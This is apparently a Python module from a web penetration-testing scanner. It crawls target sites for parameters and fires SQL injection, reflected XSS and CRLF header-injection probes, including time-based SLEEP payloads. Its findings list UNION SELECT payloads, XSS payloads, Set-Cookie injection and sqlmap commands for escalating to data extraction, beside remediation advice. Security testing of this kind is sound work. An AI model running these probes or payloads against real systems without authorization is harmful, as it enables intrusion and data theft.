"""
Confirmed injection testing — fuzz DISCOVERED parameters (not just the root) to
CONFIRM SQLi, reflected XSS, and CRLF / HTTP-response-header injection with
response evidence. This is the layer that turns "advisory: there might be SQLi
here" into "CONFIRMED: SQLi on ?category= (syntax broke on ' and repaired on '')".

Parameters come from three places so we reach app-specific params (e.g. a
category filter that only appears in Angular-rendered links): HTML forms, anchor
query strings, and a curated common-parameter fallback list applied to the base
and interesting discovered paths.

SAFETY: only safe, non-destructive probes — a single quote (and its repair), a
benign reflection canary, a benign injected response header, and an optional
time-based SLEEP. No data is modified, exfiltrated, or destroyed; weaponization
stays the human's job. Runs authenticated when the mission supplies a session.
"""
from __future__ import annotations

import random
import re
import string
import time
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse

from . import runconfig
from .detectors import _finding, _req
from .guidance import BYPASS

# ── tuning (kept bounded so the phase stays fast) ───────────────────────────
MAX_TARGETS = 40
TIME_BUDGET_S = 150
MAX_REQUESTS = 400
PAGES_PER_HOST = 12

COMMON_PARAMS = [
    "id", "category", "cat", "categoryId", "productId", "product", "q", "query",
    "search", "searchTerm", "s", "keyword", "name", "page", "sort", "order",
    "file", "path", "dir", "url", "view", "user", "userId", "lang", "type",
]
INTERESTING = ("search", "catalog", "blog", "product", "find", "filter", "result",
               "list", "item", "post", "category", "shop", "detail", "view")

SQL_ERR = re.compile(
    r"(SQL syntax|SQLSTATE|psycopg2|PostgreSQL\b.*(ERROR|error)|pg_query|"
    r"unterminated quoted string|quoted string not properly terminated|"
    r"ORA-\d{5}|Microsoft SQL Server|ODBC\b.*SQL|Unclosed quotation mark|"
    r"SQLiteException|sqlite3\.|You have an error in your SQL|"
    r"MySQL server version|com\.mysql|valid MySQL result|mysqli?_)",
    re.I,
)

FORM_RE = re.compile(r"<form\b([^>]*)>(.*?)</form>", re.I | re.S)
ACTION_RE = re.compile(r'action\s*=\s*["\']?([^"\'\s>]+)', re.I)
METHOD_RE = re.compile(r'method\s*=\s*["\']?(get|post)', re.I)
NAME_RE = re.compile(r'<(?:input|textarea|select)\b[^>]*\bname\s*=\s*["\']?([^"\'\s>]+)', re.I)
HREF_RE = re.compile(r'(?:href|action)\s*=\s*["\']([^"\']*\?[^"\']+)["\']', re.I)
LINK_RE = re.compile(r'href\s*=\s*["\']([^"\']+)["\']', re.I)


def _rand(n=6):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def _is_html(headers) -> bool:
    ct = (headers.get("Content-Type") or headers.get("content-type") or "").lower()
    return "html" in ct


# ── HTTP helper (auth-aware, timed) ─────────────────────────────────────────
def _send(url, method, param, value, auth, timeout=12):
    if method == "POST":
        h = {"Content-Type": "application/x-www-form-urlencoded"}
        h.update(auth or {})
        t = time.time()
        st, hd, bd = _req("POST", url, headers=h, data=urlencode({param: value}).encode(),
                          timeout=timeout, retries=1)
        return st, hd, bd, time.time() - t
    pr = urlparse(url)
    q = dict(parse_qsl(pr.query, keep_blank_values=True))
    q[param] = value
    full = urlunparse(pr._replace(query=urlencode(q)))
    t = time.time()
    st, hd, bd = _req("GET", full, headers=dict(auth or {}), timeout=timeout, retries=1)
    return st, hd, bd, time.time() - t


def _surface(url, method, param):
    pr = urlparse(url)
    base = urlunparse(pr._replace(query="", fragment=""))
    return f"{base}?{param}=*" + ("" if method == "GET" else f"  [{method}]")


# ── parameter discovery ─────────────────────────────────────────────────────
def _forms(html, page):
    out = []
    for m in FORM_RE.finditer(html):
        attrs, inner = m.group(1), m.group(2)
        action = ACTION_RE.search(attrs)
        method = METHOD_RE.search(attrs)
        url = urljoin(page, action.group(1)) if action else page
        meth = (method.group(1).upper() if method else "GET")
        names = [n for n in NAME_RE.findall(inner)]
        if names:
            out.append((url, meth, names))
    return out


def _hrefs(html, page):
    out = []
    for h in HREF_RE.findall(html):
        u = urljoin(page, h)
        params = [k for k, _ in parse_qsl(urlparse(u).query)]
        if params:
            out.append((u, params))
    return out


def discover_targets(recon, auth, log):
    bases = []
    for h in (recon.get("live_hosts") or [])[:3]:
        u = (h.get("url") or "").rstrip("/")
        if u:
            bases.append(u)
    if not bases:
        return []
    hostset = {urlparse(b).hostname for b in bases}

    # candidate pages: bases + discovered paths + JS endpoints (same host)
    pages, seenp = [], set()

    def add_page(u):
        u = (u or "").split("#")[0]
        if u and u not in seenp and (urlparse(u).hostname in hostset):
            seenp.add(u)
            pages.append(u)

    for b in bases:
        add_page(b)
    for _b, paths in (recon.get("dir_bust") or {}).items():
        for p in paths or []:
            add_page(p.get("url") if isinstance(p, dict) else str(p))
    for ep in recon.get("js_endpoints") or []:
        for b in bases:
            add_page(b + ep if str(ep).startswith("/") else str(ep))

    # Harvest internal links from the base pages (1-level crawl) so app routes
    # like /catalog are found even when directory-busting missed them — this is
    # what lets us reach app params (?category=) that only appear in the nav/links.
    cap = PAGES_PER_HOST * len(bases)
    for b in bases:
        st, hd, html = _req("GET", b, headers=dict(auth or {}), retries=1)
        if not (html and _is_html(hd)):
            continue
        links = LINK_RE.findall(html)[:200]
        # add interesting routes (catalog/blog/product/…) before generic ones
        links.sort(key=lambda h: 0 if any(k in h.lower() for k in INTERESTING) else 1)
        for href in links:
            if href.startswith(("mailto:", "tel:", "javascript:", "#")):
                continue
            u = urljoin(b, href).split("#")[0]
            pr = urlparse(u)
            if pr.hostname in hostset and pr.scheme in ("http", "https"):
                add_page(urlunparse(pr._replace(query="", fragment="")))
            if len(pages) >= cap:
                break
    pages = pages[:cap]

    real, common, seen = [], [], set()

    def add(bucket, url, method, param):
        if urlparse(url).hostname not in hostset:
            return
        key = (method, urlparse(url).path.lower(), param.lower())
        if key in seen:
            return
        seen.add(key)
        bucket.append((url, method, param))

    for page in pages:
        for k, _ in parse_qsl(urlparse(page).query):
            add(real, page, "GET", k)
        st, hd, html = _req("GET", page, headers=dict(auth or {}), retries=1)
        if html and _is_html(hd):
            for url, meth, names in _forms(html, page):
                for n in names:
                    add(real, url, meth, n)
            for u2, params in _hrefs(html, page):
                for p in params:
                    add(real, u2, "GET", p)
        # common-parameter fallback on the base + interesting pages
        if page in bases or any(k in page.lower() for k in INTERESTING):
            for c in COMMON_PARAMS:
                add(common, page, "GET", c)

    targets = (real + common)[:MAX_TARGETS]
    if log:
        log(f"injection: {len(targets)} parameter target(s) discovered "
            f"({len(real)} from forms/links, rest common-param fallback)", "info", "detect")
    return targets


# ── individual confirmations ────────────────────────────────────────────────
def _test_sqli(url, method, param, auth, budget):
    seed = "1"
    b_st, _, b_body, _ = _send(url, method, param, seed, auth); budget["n"] += 1
    q_st, _, q_body, _ = _send(url, method, param, seed + "'", auth); budget["n"] += 1
    err = bool(SQL_ERR.search(q_body or ""))
    base_ok = isinstance(b_st, int) and b_st < 500
    broke = isinstance(q_st, int) and q_st >= 500 and base_ok
    changed = (q_st != b_st) or (abs(len(q_body or "") - len(b_body or "")) > 40)

    if err or broke:
        r1_st, _, _, _ = _send(url, method, param, seed + "''", auth); budget["n"] += 1
        r2_st, _, _, _ = _send(url, method, param, seed + "'-- -", auth); budget["n"] += 1
        repaired = base_ok and any(isinstance(s, int) and s < 500 for s in (r1_st, r2_st))
        if err or repaired:
            how_evidence = (
                f"SQL error signature returned on ?{param}=1'" if err else
                f"?{param}=1' broke the query (HTTP {q_st}); ?{param}=1'' and ?{param}=1'-- - repaired it (HTTP {r1_st}/{r2_st}) — the quote is parsed as SQL"
            )
            return _finding(
                key="sqli-confirm", title="SQL injection — CONFIRMED", category="Injection",
                severity="CRITICAL" if err else "HIGH", surface=_surface(url, method, param),
                confidence=93 if err else 90,
                evidence=how_evidence,
                what=f"The `{param}` parameter is injectable into a SQL query. Confirmed by "
                     f"{'a database error signature' if err else 'syntax break-and-repair'}. Escalate to data extraction manually.",
                how=[f"Reproduce: send ?{param}=1' (breaks) then ?{param}=1'-- - (repairs).",
                     "Determine the DB (error text / behaviour) and column count with ORDER BY / UNION SELECT.",
                     "Extract with UNION or blind (boolean/time) techniques; confirm impact, do not destroy data.",
                     "sqlmap in confirm mode: sqlmap -u '<url>' -p " + param + " --batch"],
                payloads=["'", "1' ORDER BY 1-- -", "1' UNION SELECT NULL-- -",
                          "1' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -", "1'||pg_sleep(5)--"],
                bypass=BYPASS["sqli"],
                tools=["curl", "sqlmap"],
                curl_steps=[{"desc": "Break the query", "cmd": f"curl -sS -k \"{_ex(url, method, param, chr(39))}\""},
                            {"desc": "Repair (proves SQL parsing)", "cmd": f"curl -sS -k \"{_ex(url, method, param, chr(39) + '-- -')}\""}],
                references=[{"title": "PortSwigger · SQL injection", "url": "https://portswigger.net/web-security/sql-injection"}],
                remediation={"summary": "Use parameterized queries / prepared statements; never concatenate input into SQL. Add least-privilege DB accounts.", "fixes": []},
                tags=["sqli", "injection", "confirmed", "exploit-guidance"],
            )

    # blind time-based fallback — only if the quote perturbed the response at all
    if changed and budget["n"] < MAX_REQUESTS:
        for pl in ("1'||pg_sleep(5)--", "1' AND SLEEP(5)-- -", "1');WAITFOR DELAY '0:0:5'-- -"):
            _, _, _, el = _send(url, method, param, pl, auth, timeout=12); budget["n"] += 1
            if el >= 4.5:
                _, _, _, el2 = _send(url, method, param, "1' AND '1'='1'-- -", auth); budget["n"] += 1
                if el2 < 3.0:  # control request is fast → the delay was our payload
                    return _finding(
                        key="sqli-blind", title="Blind SQL injection (time-based) — CONFIRMED",
                        category="Injection", severity="HIGH", surface=_surface(url, method, param),
                        confidence=87,
                        evidence=f"A SLEEP(5) payload on ?{param}= delayed the response {el:.1f}s while a control request returned in {el2:.1f}s.",
                        what=f"The `{param}` parameter is injectable (blind, time-based). No output is reflected; extract data with time/boolean techniques.",
                        how=["Confirm the delay is controllable (try SLEEP(2) vs SLEEP(8)).",
                             "Use conditional time payloads to extract data bit by bit.",
                             "sqlmap --technique=T is well-suited to this."],
                        payloads=["1'||pg_sleep(5)--", "1' AND SLEEP(5)-- -", "1');WAITFOR DELAY '0:0:5'-- -"],
                        bypass=BYPASS["sqli"],
                        tools=["curl", "sqlmap"],
                        references=[{"title": "PortSwigger · Blind SQLi", "url": "https://portswigger.net/web-security/sql-injection/blind"}],
                        remediation={"summary": "Use parameterized queries; never concatenate input into SQL.", "fixes": []},
                        tags=["sqli", "blind", "injection", "confirmed", "exploit-guidance"],
                    )
            if budget["n"] >= MAX_REQUESTS:
                break
    return None


def _test_xss(url, method, param, auth, budget):
    tok = "rtx" + _rand()
    canary = f'{tok}"><{tok}z>'
    st, hd, body, _ = _send(url, method, param, canary, auth); budget["n"] += 1
    if body and _is_html(hd) and f"<{tok}z>" in body:
        return _finding(
            key="xss-reflect-confirm", title="Reflected XSS — CONFIRMED (unencoded reflection)",
            category="Injection", severity="HIGH", surface=_surface(url, method, param), confidence=88,
            evidence=f"A benign canary <{tok}z> injected via ?{param}= was reflected raw (unencoded) in the HTML response.",
            what=f"The `{param}` parameter reflects into HTML without encoding — a reflected-XSS sink. "
                 f"Round Table proved reflection with a harmless marker; weaponize manually.",
            how=[f"Reproduce and confirm the marker tag appears unescaped in the response.",
                 "Swap in an executing payload matched to the context (HTML/attr/JS) and confirm in a browser.",
                 "Report reflected XSS with the exact parameter, context, and impact."],
            payloads=['"><img src=x onerror=alert(document.domain)>', "<svg onload=alert(document.domain)>",
                      "'-alert(document.domain)-'"],
            bypass=BYPASS["xss"],
            tools=["curl", "browser"],
            curl_steps=[{"desc": "Reflect the canary", "cmd": f"curl -sS -k \"{_ex(url, method, param, canary)}\""}],
            references=[{"title": "PortSwigger · Reflected XSS", "url": "https://portswigger.net/web-security/cross-site-scripting/reflected"}],
            remediation={"summary": "Context-encode all reflected output; add a strict Content-Security-Policy.", "fixes": []},
            tags=["xss", "reflected", "injection", "confirmed", "exploit-guidance"],
        )
    return None


def _test_crlf(url, method, param, auth, budget):
    tok = _rand()
    hdr = f"X-Rt-{tok}"
    st, hd, body, _ = _send(url, method, param, f"1\r\n{hdr}: injected", auth); budget["n"] += 1
    keys = {k.lower() for k in (hd or {}).keys()}
    if hdr.lower() in keys:
        return _finding(
            key="crlf-confirm", title="HTTP response header injection (CRLF) — CONFIRMED",
            category="Injection", severity="HIGH", surface=_surface(url, method, param), confidence=90,
            evidence=f"A CRLF payload on ?{param}= injected a new response header ({hdr}), confirming HTTP response splitting.",
            what=f"The `{param}` parameter allows CR/LF into the response headers — enables header injection, "
                 f"response splitting, cache poisoning, and can chain to XSS.",
            how=["Reproduce and confirm the injected header appears in the response.",
                 "Try injecting Set-Cookie (session fixation) or a body to attempt response splitting / cache poisoning.",
                 "Report with the concrete impact you can demonstrate."],
            payloads=["%0d%0aX-Injected: rt", "%0d%0aSet-Cookie: rt=1", "%0d%0a%0d%0a<script>alert(1)</script>"],
            bypass=BYPASS["crlf"],
            tools=["curl"],
            curl_steps=[{"desc": "Inject a header via CRLF",
                         "cmd": f"curl -sS -k -i \"{_ex(url, method, param, '1%0d%0aX-Injected: rt')}\""}],
            references=[{"title": "OWASP · HTTP Response Splitting", "url": "https://owasp.org/www-community/attacks/HTTP_Response_Splitting"}],
            remediation={"summary": "Strip/reject CR and LF from any user input used in response headers or redirects.", "fixes": []},
            tags=["crlf", "injection", "confirmed", "exploit-guidance"],
        )
    return None


def _ex(url, method, param, value):
    """Human-readable example URL with the param set (for cURL steps)."""
    pr = urlparse(url)
    q = dict(parse_qsl(pr.query, keep_blank_values=True))
    q[param] = value
    return urlunparse(pr._replace(query=urlencode(q, safe="'-\r\n %")))


# ── orchestrator ────────────────────────────────────────────────────────────
def run_injection_tests(recon, config, log) -> list[dict]:
    auth = {h.split(":", 1)[0].strip(): h.split(":", 1)[1].strip()
            for h in runconfig.auth_headers(config or {}) if ":" in h}
    try:
        targets = discover_targets(recon, auth, log)
    except Exception as e:
        if log:
            log(f"injection: param discovery failed: {type(e).__name__}", "warn", "detect")
        return []
    if not targets:
        return []

    log("── Confirmed injection testing (SQLi / XSS / CRLF on discovered params) ──", "hdr", "detect")
    by_key: dict = {}  # (finding-key, host, param) -> finding (prefer a surface with a path)
    budget = {"n": 0}
    deadline = time.time() + TIME_BUDGET_S

    for url, method, param in targets:
        if budget["n"] >= MAX_REQUESTS or time.time() > deadline:
            break
        host = urlparse(url).hostname
        for test in (_test_sqli, _test_xss, _test_crlf):
            if budget["n"] >= MAX_REQUESTS or time.time() > deadline:
                break
            try:
                f = test(url, method, param, auth, budget)
            except Exception:
                f = None
            if not f:
                continue
            dk = (f["key"], host, param.lower())
            prev = by_key.get(dk)
            has_path = urlparse(url).path not in ("", "/")
            if prev is None:
                by_key[dk] = f
                if log:
                    log(f"CONFIRMED: {f['title']} @ {f['surface']}", "ok", "detect")
            elif has_path and urlparse(prev["surface"]).path in ("", "/"):
                by_key[dk] = f  # prefer the more specific (path-bearing) surface

    findings = list(by_key.values())
    log(f"injection testing: {len(findings)} confirmed issue(s) in {budget['n']} request(s)", "ok", "detect")
    return findings
